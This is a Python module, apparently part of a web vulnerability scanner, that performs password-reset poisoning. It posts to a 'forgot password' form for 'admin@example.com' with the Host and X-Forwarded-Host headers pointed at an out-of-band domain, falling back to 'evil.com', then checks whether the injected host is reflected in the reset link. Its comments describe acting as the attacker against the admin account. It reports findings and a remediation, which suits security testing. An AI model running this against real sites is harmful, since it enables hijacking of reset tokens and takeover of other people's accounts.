import aiohttp
import asyncio
from core.oast import oast_manager

async def exploit_reset_poison(url, param=None, log_callback=None, headers=None, proxy=None):
    """
    Attempts Host Header Injection on Password Reset pages to hijack reset tokens.
    """
    findings = []
    
    # Evasion Headers
    final_headers = headers.copy() if headers else {}
    
    # We need an OAST domain to catch the token
    oast_domain = oast_manager.get_oast_domain()
    if not oast_domain:
        oast_domain = "evil.com" # Fallback if OAST not configured
        
    try:
        # Scenario: The finding URL is the "Forgot Password" form handler.
        # We perform the POST request with a poisoned Host header.
        
        # NOTE: Without knowing the exact form inputs (email, username), this is tricky.
        # Blind approach: If finding 'detail' captured the form input name (e.g., 'email'), we use it.
        # Assume 'param' is the input field name for email, or we guess common ones.
        
        target_email = "admin@example.com" # We try to hijack admin? Or self-test?
        # For safety/verification, usually we need a controlled account.
        # But here we act as the attacker blindly targeting admin.
        
        input_field = param if param else "email"
        
        exploit_headers = final_headers.copy()
        exploit_headers["Host"] = oast_domain
        exploit_headers["X-Forwarded-Host"] = oast_domain
        
        data = {input_field: target_email}
        
        async with aiohttp.ClientSession() as session:
            try:
                if log_callback: log_callback(f"   üêç Reset Poison: Injecting Host: {oast_domain}...")
                
                async with session.post(url, headers=exploit_headers, data=data, timeout=5, ssl=False, proxy=proxy) as resp:
                    # 1. Reflection Check
                    # If the response contains our evil domain, it's vulnerable (Reflected).
                    # e.g. "Email sent to admin@example.com. Link: http://evil.com/reset..."
                    
                    text = await resp.text()
                    if oast_domain in text:
                         # Highly likely vulnerable if the link is generated in the response text
                         findings.append({
                            "type": "Password Reset Poisoning (Reflected)",
                            "severity": "Critical",
                            "detail": "The application reflects the injected Host header in the response body (likely in the reset link).",
                            "evidence": f"Injected: {oast_domain}\nReflected: {text[:200]}",
                            "remediation": "Validate Host header against a whitelist."
                        })
                    
                    # 2. OAST Interaction Check (Blind)
                    # We can't check this immediately. The email needs to be sent and clicked?
                    # Or the email server looks up the domain?
                    # For now, we rely on the Reflection check as the primary indicator for this module.
                    
            except Exception: pass
    except Exception: pass
    
    return findings
